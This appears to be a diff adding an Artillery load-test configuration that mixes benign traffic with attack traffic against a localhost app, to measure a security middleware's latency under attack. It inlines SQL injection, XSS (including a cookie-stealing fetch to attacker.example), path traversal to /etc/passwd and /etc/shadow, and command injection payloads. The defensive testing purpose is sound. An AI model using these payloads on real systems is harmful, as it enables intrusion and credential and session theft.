@@ -1,0 +1,151 @@
+config:
+  target: "http://localhost:3000"
+  # "Carga de ataque" per protocolo_sebastian's acceptance metric (Delta
+  # latencia p95 <= 10% bajo carga de ataque). This scenario did not exist
+  # anywhere in the project before this file - artillery-baseline.yml only
+  # ever exercised the benign flow. Here benign navigation traffic and
+  # attack-payload traffic run CONCURRENTLY in the same phases, so p95 is
+  # measured under the mixed load the middleware actually sees in the
+  # "carga de ataque" condition, not attacks-only or benign-only.
+  #
+  # Payload subsets below are copied from attack-sim/payloads/{sqli,xss,
+  # path_traversal,cmdi}.json (which do exist in this worktree). Artillery's
+  # core `variables:` block only accepts literal arrays - it cannot read an
+  # external JSON file as a pick-list without a custom processor plugin - so
+  # a representative subset (6-8 per category, covering the distinct
+  # technique families in each file) is inlined here rather than pulling in
+  # a plugin dependency for this. Full 100-payload-per-category coverage
+  # testing is attack-sim/run-attacks.js's job (detection rate), not this
+  # file's (latency under mixed load).
+  phases:
+    # Warmup only - NOT measured. Same rationale as artillery-baseline.yml:
+    # IF worker pool needs ~5s to reach session-ready.
+    - duration: 15
+      arrivalRate: 5
+      name: "warmup (discard from analysis)"
+    # Measured phase. Weighted scenarios below average ~3.4 requests/VU
+    # (70% benign @ 4 req/VU, 30% attack scenarios @ ~2 req/VU including
+    # their login step), so arrivalRate 30 targets ~100 req/s real HTTP
+    # throughput, consistent with the ~100 req/s baseline target. Re-check
+    # the actual measured http.request_rate in the report - the 3.4 figure
+    # is a design estimate, not a guarantee, since scenario picking and
+    # request counts vary per run.
+    - duration: 60
+      arrivalRate: 30
+      name: "mixed benign + attack load (measured)"
+  variables:
+    postId:
+      - 1
+      - 2
+      - 3
+      - 4
+      - 5
+      - 6
+      - 7
+      - 8
+      - 9
+      - 10
+    sqliPayload:
+      - "' OR '1'='1' --"
+      - "' OR '1'='1' #"
+      - "' OR 1=1 -- -"
+      - "admin' --"
+      - "admin' #"
+      - "' OR ''='"
+      - "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+      - "' UNION SELECT username,password,NULL,NULL,NULL FROM users--"
+    xssPayload:
+      - "<script>alert(1)</script>"
+      - "<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>"
+      - "<img src=x onerror=alert(1)>"
+      - "<svg onload=alert(1)>"
+      - "<body onload=alert(1)>"
+      - "<iframe src=javascript:alert(1)>"
+      - "\"><script>alert(1)</script>"
+    pathTraversalPayload:
+      - "../../../../etc/passwd"
+      - "../../../etc/passwd"
+      - "..\\..\\..\\..\\windows\\win.ini"
+      - "....//....//....//etc/passwd"
+      - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      - "..%2f..%2f..%2fetc%2fpasswd"
+      - "../../../../../../etc/shadow"
+    cmdiPayload:
+      - "127.0.0.1; cat /etc/passwd"
+      - "127.0.0.1 && cat /etc/passwd"
+      - "127.0.0.1 | cat /etc/passwd"
+      - "127.0.0.1; whoami"
+      - "127.0.0.1 && whoami"
+      - "127.0.0.1; ls -la /"
+      - "127.0.0.1 & whoami"
+      - "127.0.0.1 || whoami"
+
+scenarios:
+  # Legitimate traffic - the load logSguarDian must not slow down.
+  - name: "benign navigation"
+    weight: 70
+    flow:
+      - post:
+          url: "/login"
+          followRedirect: false
+          form:
+            username: "alice"
+            password: "alice123"
+      - get:
+          url: "/posts"
+      - get:
+          url: "/posts/{{ postId }}"
+      - get:
+          url: "/profile"
+
+  # Attack traffic - concurrent with the benign flow above, not a separate
+  # run. This is what exercises the "carga de ataque" condition.
+  - name: "attack: sqli via login"
+    weight: 10
+    flow:
+      - post:
+          url: "/login"
+          followRedirect: false
+          form:
+            username: "{{ sqliPayload }}"
+            password: "x"
+
+  - name: "attack: xss via profile bio"
+    weight: 8
+    flow:
+      - post:
+          url: "/login"
+          followRedirect: false
+          form:
+            username: "alice"
+            password: "alice123"
+      - post:
+          url: "/profile"
+          form:
+            bio: "{{ xssPayload }}"
+
+  - name: "attack: path traversal via attachment"
+    weight: 7
+    flow:
+      - post:
+          url: "/login"
+          followRedirect: false
+          form:
+            username: "alice"
+            password: "alice123"
+      - get:
+          url: "/posts/1/attachment?file={{ pathTraversalPayload }}"
+
+  - name: "attack: command injection via admin ping"
+    weight: 5
+    flow:
+      - post:
+          url: "/login"
+          followRedirect: false
+          form:
+            username: "admin"
+            password: "admin123"
+      - post:
+          url: "/admin/ping"
+          form:
+            host: "{{ cmdiPayload }}"
